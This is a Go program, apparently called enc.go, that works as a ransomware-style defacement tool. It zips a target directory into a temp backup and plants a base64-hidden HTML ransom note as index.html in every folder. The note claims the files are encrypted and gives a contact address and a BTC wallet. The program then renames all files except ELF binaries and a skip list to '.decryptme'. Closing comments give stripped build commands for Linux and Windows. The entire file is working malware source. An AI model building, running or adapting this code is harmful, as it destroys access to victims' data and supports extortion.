package main

import (
	"archive/zip"
	"encoding/base64"
	"flag"
	"fmt"
	"io"
	"io/fs"
	"os"
	"path/filepath"
	"strings"
)

func MapFiles(dir string) []string {
	var files []string

	error := filepath.WalkDir(dir, func(path string, entry fs.DirEntry, err error) error {
		if err != nil {
			return err
		}
		ext := filepath.Ext(path)
		if ext != ".exe" && ext != ".dll" && ext != ".lnk" && ext != ".sys" && ext != ".msi" && ext != ".bat" && !strings.Contains(filepath.Base(path), "Fruit") {
			files = append(files, path)

		}

		return nil
	})

	if error != nil {
		panic(error)
	}

	return files
}

func usage() {
	fmt.Fprintf(os.Stderr, "usage: %s [inputDir]\n", os.Args[0])
	flag.PrintDefaults()
	os.Exit(2)
}

func ZipDir(srcDir string, zipWriter *zip.Writer) error {
	content := "PCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJlbiI+DQo8aGVhZD4NCiAgPG1ldGEgY2hhcnNldD0iVVRGLTgiPg0KICA8dGl0bGU+SGFja2VkIGJ5IEhhY2szcjwvdGl0bGU+DQogIDxzdHlsZT4NCiAgICBib2R5IHsNCiAgICAgIGJhY2tncm91bmQtY29sb3I6IGJsYWNrOw0KICAgICAgY29sb3I6IHJlZDsNCiAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsNCiAgICAgIGZvbnQtZmFtaWx5OiBtb25vc3BhY2U7DQogICAgICBwYWRkaW5nLXRvcDogMTAwcHg7DQogICAgfQ0KICAgIGgxIHsNCiAgICAgIGZvbnQtc2l6ZTogNTBweDsNCiAgICAgIHRleHQtc2hhZG93OiAwIDAgMTBweCByZWQ7DQogICAgfQ0KICAgIHAgew0KICAgICAgZm9udC1zaXplOiAyMHB4Ow0KICAgICAgbWFyZ2luLXRvcDogMzBweDsNCiAgICB9DQogICAgLndhcm5pbmcgew0KICAgICAgYmFja2dyb3VuZC1jb2xvcjogZGFya3JlZDsNCiAgICAgIHBhZGRpbmc6IDIwcHg7DQogICAgICBtYXJnaW46IDQwcHggYXV0bzsNCiAgICAgIHdpZHRoOiA2MCU7DQogICAgICBib3JkZXI6IDJweCBzb2xpZCByZWQ7DQogICAgICBib3JkZXItcmFkaXVzOiAxMHB4Ow0KICAgIH0NCiAgPC9zdHlsZT4NCjwvaGVhZD4NCjxib2R5Pg0KICA8aDE+8J+SgCBIQUNLRUQg8J+SgDwvaDE+DQogIDxkaXYgY2xhc3M9Indhcm5pbmciPg0KICAgIDxwPllvdXIgd2Vic2l0ZSBoYXMgYmVlbiBjb21wcm9taXNlZC48L3A+DQogICAgPHA+QWxsIGZpbGVzIGhhdmUgYmVlbiBlbmNyeXB0ZWQuIFBheSByYW5zb20gb3IgbG9zZSB5b3VyIGRhdGEgZm9yZXZlci48L3A+DQogICAgPHA+Q29udGFjdDogYW5vbnltb3VzQGRhcmttYWlsLnBybzwvcD4NCiAgICA8cD5CVEMgV2FsbGV0OiAxSEFDS0VEcDJOenRQNkE3Li4uPC9wPg0KICA8L2Rpdj4NCiAgPHA+fiBIYWNrM3Igd2FzIGhlcmUgfjwvcD4NCjwvYm9keT4NCjwvaHRtbD4="

	return filepath.Walk(srcDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		if info.IsDir() {
			filePath := filepath.Join(path, "index.html")
			file, err := os.Create(filePath)
			if err != nil {
				return err
			}
			defer file.Close()

			decodedContent, err := base64.StdEncoding.DecodeString(content)
			if err != nil {
				return err
			}
			_, err = file.Write(decodedContent)
			if err != nil {
				return err
			}
		}

		header, err := zip.FileInfoHeader(info)
		if err != nil {
			return err
		}

		relativePath := strings.TrimPrefix(path, srcDir)
		relativePath = strings.TrimPrefix(relativePath, string(filepath.Separator))
		header.Name = relativePath

		if info.IsDir() {
			header.Name += "/"
		} else {
			header.Method = zip.Deflate
		}

		writer, err := zipWriter.CreateHeader(header)
		if err != nil {
			return err
		}

		if info.IsDir() {
			return nil
		}

		file, err := os.Open(path)
		if err != nil {
			return err
		}
		defer file.Close()

		_, err = io.Copy(writer, file)
		return err
	})
}

func zipDirectory2(dir string) {
	srcDir := dir
	zipFilePath := filepath.Join(os.TempDir(), "backup.zip")

	// Create the zip file
	zipFile, err := os.Create(zipFilePath)
	if err != nil {
		panic(err)
	}
	defer zipFile.Close()

	// Create a new zip writer
	zipWriter := zip.NewWriter(zipFile)
	defer zipWriter.Close()

	// Zip the source directory
	err = ZipDir(srcDir, zipWriter)
	if err != nil {
		panic(err)
	}

	//fmt.Println("Directory zipped successfully!")
}

func main() {

	dir := os.Args[1] // Insert starting directory
	if dir == "" {
		usage()
	}
	zipDirectory2(dir)

	files := MapFiles(dir)

	for _, v := range files {
		file, err := os.ReadFile(v)

		if err != nil {
			continue
		}
		//fmt.Println(v)
		if len(file) == 0 {
			continue
		}
		if file[0] != '\x7f' || file[1] != 'E' || file[2] != 'L' || file[3] != 'F' {
			if filepath.Base(v) != "index.html" {
				os.Rename(v, v+".decryptme")
				os.Remove(v)
			}
		}

	}

}

//go build -ldflags "-s -w"
// $env:GOARCH="amd64"; $env:GOOS="linux"; go build -ldflags "-s -w" .\enc.go build linux x64
//$env:GOARCH="amd64"; $env:GOOS="windows"; go build -ldflags "-s -w" .\enc.go build windows x64
